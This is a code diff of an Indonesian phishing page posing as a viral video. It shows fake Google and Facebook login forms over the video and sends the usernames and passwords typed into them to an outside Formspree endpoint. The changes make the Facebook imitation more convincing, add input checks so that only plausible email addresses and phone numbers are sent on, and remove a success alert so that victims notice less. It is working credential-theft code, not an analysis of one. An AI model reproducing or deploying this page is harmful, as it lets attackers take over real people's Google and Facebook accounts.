@@ -5,24 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Teh Pucuk Viral</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', 'Segoe UI', Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         
-        html, body {
-            height: 100%; width: 100%; background-color: #000; overflow: hidden;
-        }
+        html, body { height: 100%; width: 100%; background-color: #000; overflow: hidden; }
 
-        /* Video Background (Videy Player) */
-        #video-container {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1;
-        }
+        /* Video Background */
+        #video-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
         iframe { width: 100%; height: 100%; border: none; }
 
-        /* Area Klik Pemicu (Transparan) */
-        #click-trigger {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 2; cursor: pointer;
-        }
+        /* Area Klik Pemicu */
+        #click-trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; cursor: pointer; }
 
         /* Overlay Utama */
         #main-overlay {
@@ -33,60 +25,62 @@
 
         /* Card Umum */
         .card {
-            background: #fff; width: 92%; max-width: 400px; padding: 35px 25px;
+            background: #fff; width: 92%; max-width: 396px; padding: 25px 20px;
             border-radius: 8px; position: relative;
-            box-shadow: 0 12px 28px rgba(0,0,0,0.25);
-            animation: popUp 0.3s ease-out;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.2), 0 2px 4px rgba(0,0,0,0.1);
+            animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-align: center;
         }
 
-        @keyframes popUp { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes popUp { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
 
-        .close-btn {
-            position: absolute; top: 12px; right: 15px; font-size: 26px;
-            color: #606770; cursor: pointer; line-height: 1;
-        }
+        .close-btn { position: absolute; top: 12px; right: 15px; font-size: 24px; color: #606770; cursor: pointer; line-height: 1; }
 
-        /* --- PILIHAN LOGIN --- */
-        #choice-section h2 { font-size: 20px; font-weight: 500; margin-bottom: 25px; color: #1c1e21; text-align: center; }
+        .error-msg { color: #d93025; font-size: 13px; margin-bottom: 12px; display: none; text-align: left; background: #ffebe8; border: 1px solid #ddd; padding: 8px; border-radius: 4px; }
+
+        /* --- MENU PILIHAN --- */
+        #choice-section h2 { font-size: 20px; font-weight: 500; margin-bottom: 25px; color: #1c1e21; }
         .btn-choice {
             display: flex; align-items: center; justify-content: center;
             width: 100%; padding: 12px; margin-bottom: 12px;
             border-radius: 6px; border: 1px solid #dadce0;
-            font-size: 15px; font-weight: 500; cursor: pointer;
+            font-size: 16px; font-weight: 500; cursor: pointer;
         }
         .btn-google { background: #fff; color: #3c4043; }
-        .btn-facebook { background: #1877f2; color: white; border: none; }
+        .btn-facebook-choice { background: #1877f2; color: white; border: none; }
         .btn-choice img { width: 18px; margin-right: 12px; }
 
         /* --- FACEBOOK STYLE --- */
-        #fb-section { display: none; text-align: center; }
-        .fb-logo { width: 120px; margin: 0 auto 15px; display: block; }
-        .fb-text { font-size: 16px; color: #1c1e21; margin-bottom: 20px; line-height: 1.3; font-weight: 400; }
+        #fb-section { display: none; }
+        .fb-logo { width: 112px; margin: 10px auto 25px; display: block; }
         .fb-input {
             width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
             border-radius: 6px; font-size: 15px; margin-bottom: 12px;
-            background: #f5f6f7; outline: none;
+            background: #f5f6f7; outline: none; display: block;
         }
         .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
-        .fb-btn { 
+        .fb-btn-login { 
             width: 100%; background: #1877f2; color: #fff; border: none; 
-            padding: 10px; border-radius: 6px; font-size: 19px; font-weight: bold; cursor: pointer;
+            padding: 10px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer;
         }
+        .fb-forgot { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin: 18px 0; font-weight: 500; }
+        .fb-divider { display: flex; align-items: center; color: #8a8d91; font-size: 13px; margin: 15px 0; }
+        .fb-divider::before, .fb-divider::after { content: ""; flex: 1; border-bottom: 1px solid #dadce1; }
+        .fb-divider:not(:empty)::before { margin-right: .5em; }
+        .fb-divider:not(:empty)::after { margin-left: .5em; }
+        .fb-btn-new { background-color: #42b72a; color: #fff; border: none; padding: 10px 16px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; display: inline-block; }
 
         /* --- GOOGLE STYLE --- */
         #google-section { display: none; text-align: left; }
         .g-logo { width: 75px; display: block; margin: 0 auto 10px; }
-        .g-title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 10px; }
+        .g-title { font-size: 24px; text-align: center; margin-bottom: 10px; font-weight: 400; color: #202124; }
         .g-subtitle { font-size: 16px; text-align: center; margin-bottom: 30px; color: #202124; }
-        .g-input {
-            width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
-            border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none;
-        }
-        .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .g-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none; }
+        .g-input:focus { border: 2px solid #1a73e8; }
         .g-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 25px; }
         .g-btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
 
-        /* Password Visibility Utility */
+        /* Ikon Mata */
         .pw-wrapper { position: relative; width: 100%; }
         .eye-btn {
             position: absolute; right: 12px; top: 12px; cursor: pointer;
@@ -108,40 +102,43 @@
         <div id="choice-section" class="card">
             <h2>Lanjutkan Menonton</h2>
             <div class="btn-choice btn-google" onclick="showForm('google')">
-                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png"> Login dengan Google
+                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" alt="G"> Login dengan Google
             </div>
-            <div class="btn-choice btn-facebook" onclick="showForm('fb')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"> Login dengan Facebook
+            <div class="btn-choice btn-facebook-choice" onclick="showForm('fb')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="F"> Login dengan Facebook
             </div>
-            <p style="text-align: center; font-size: 12px; color: #70757a; margin-top: 10px;">Verifikasi diperlukan untuk melanjutkan video.</p>
+            <p style="font-size: 12px; color: #70757a; margin-top: 10px;">Verifikasi diperlukan untuk melanjutkan video.</p>
         </div>
 
         <div id="fb-section" class="card">
             <span class="close-btn" onclick="backToMenu()">&times;</span>
-            <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg">
-            <p class="fb-text">Gunakan Akun Facebook Anda</p>
-            <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
-                <input type="text" name="Username_FB" class="fb-input" placeholder="Nomor ponsel atau email" required>
+            <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook">
+            <div id="fb-error-msg" class="error-msg">Email atau nomor ponsel salah.</div>
+            <form class="ajax-form" data-type="facebook" action="https://formspree.io/f/xgolkjyz" method="POST">
+                <input type="text" name="Email_FB" class="fb-input user-input" placeholder="Nomor ponsel atau email" required>
                 <div class="pw-wrapper">
-                    <input type="password" name="Sandi_FB" class="fb-input pw-field" placeholder="Kata sandi" required>
+                    <input type="password" name="Pass_FB" class="fb-input pw-field" placeholder="Kata sandi" required>
                     <span class="eye-btn" onclick="togglePassword(this)">
                         <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     </span>
                 </div>
-                <button type="submit" class="fb-btn">Login</button>
-                <p style="color:#1877f2; font-size:14px; margin-top:15px; cursor:pointer;">Lupa kata sandi?</p>
+                <button type="submit" class="fb-btn-login">Log In</button>
+                <a href="#" class="fb-forgot">Lupa Kata Sandi?</a>
+                <div class="fb-divider">atau</div>
+                <button type="button" class="fb-btn-new">Buat Akun Baru</button>
             </form>
         </div>
 
         <div id="google-section" class="card">
             <span class="close-btn" onclick="backToMenu()">&times;</span>
-            <img class="g-logo" src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
+            <img class="g-logo" src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google">
             <h1 class="g-title">Login</h1>
             <p class="g-subtitle">Gunakan Akun Google Anda</p>
-            <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
-                <input type="text" name="Username_Google" class="g-input" placeholder="Email atau ponsel" required>
+            <div id="g-error-msg" class="error-msg">Masukkan akun yang valid.</div>
+            <form class="ajax-form" data-type="google" action="https://formspree.io/f/xgolkjyz" method="POST">
+                <input type="text" name="Email_Google" class="g-input user-input" placeholder="Email atau ponsel" required>
                 <div class="pw-wrapper">
-                    <input type="password" name="Sandi_Google" class="g-input pw-field" placeholder="Masukkan sandi Anda" required>
+                    <input type="password" name="Pass_Google" class="g-input pw-field" placeholder="Masukkan sandi Anda" required>
                     <span class="eye-btn" onclick="togglePassword(this)">
                         <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     </span>
@@ -167,6 +164,7 @@
         }
 
         function backToMenu() {
+            document.querySelectorAll('.error-msg').forEach(e => e.style.display = 'none');
             document.getElementById('fb-section').style.display = 'none';
             document.getElementById('google-section').style.display = 'none';
             document.getElementById('choice-section').style.display = 'block';
@@ -177,27 +175,34 @@
             input.type = input.type === 'password' ? 'text' : 'password';
         }
 
-        // Script AJAX & Auto Hide
         const forms = document.querySelectorAll('.ajax-form');
         forms.forEach(form => {
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
-                const btn = form.querySelector('button');
-                btn.innerHTML = "Memuat...";
-                btn.disabled = true;
+                const type = form.getAttribute('data-type');
+                const userInput = form.querySelector('.user-input').value.toLowerCase();
+                const fbError = document.getElementById('fb-error-msg');
+                const gError = document.getElementById('g-error-msg');
                 
+                const isEmail = (userInput.includes('@gmail.com') || userInput.includes('@yahoo.com')) && userInput.length > 10;
+                const isPhone = /^\d+$/.test(userInput) && userInput.length >= 10;
+
+                if (!isEmail && !isPhone) {
+                    if(type === 'facebook') fbError.style.display = 'block';
+                    else gError.style.display = 'block';
+                    return false;
+                }
+
+                const btn = form.querySelector('button');
+                btn.innerHTML = "Memproses...";
+                btn.disabled = true;
+
                 const formData = new FormData(form);
                 try {
-                    await fetch(form.action, {
-                        method: 'POST',
-                        body: formData,
-                        headers: { 'Accept': 'application/json' }
-                    });
+                    await fetch(form.action, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
                 } catch (err) {}
                 
-                // Form hilang, video lanjut
                 document.getElementById('main-overlay').style.display = 'none';
-                alert("Verifikasi berhasil. Selamat menonton!");
             });
         });
     </script>
